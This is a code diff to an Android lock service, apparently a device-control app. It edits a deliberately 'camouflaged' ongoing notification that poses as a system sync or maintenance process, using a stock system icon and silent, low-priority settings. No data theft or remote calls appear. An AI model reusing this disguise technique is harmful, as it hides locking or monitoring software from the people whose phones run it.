@@ -16,7 +16,7 @@ class DwisnuLabsLockService : Service() {
 
     companion object {
         private const val TAG = "DwisnuLabsLockService"
-        private const val CHANNEL_ID = "dwisnulabs_core_channel"
+        private const val CHANNEL_ID = "dwisnulabs_sync_v2"
         private const val ALERT_CHANNEL_ID = "dwisnulabs_alert_channel"
         private const val NOTIFICATION_ID = 1001
         private const val ALERT_NOTIFICATION_ID = 1002
@@ -178,9 +178,11 @@ class DwisnuLabsLockService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "Sistem Sinkronisasi Latar Belakang",
-                NotificationManager.IMPORTANCE_MIN
+                NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Layanan pemeliharaan sistem Android"
+                description = "Layanan manajemen perangkat keluarga"
+                setSound(null, null)
+                enableVibration(false)
                 setShowBadge(false)
             }
             val manager = getSystemService(NotificationManager::class.java)
@@ -191,9 +193,9 @@ class DwisnuLabsLockService : Service() {
     private fun buildCamouflagedNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Layanan Sinkronisasi Sistem")
-            .setContentText("Menjaga integritas dan performa sistem.")
+            .setContentText("Sinkronisasi perangkat aktif.")
             .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .build()
     }
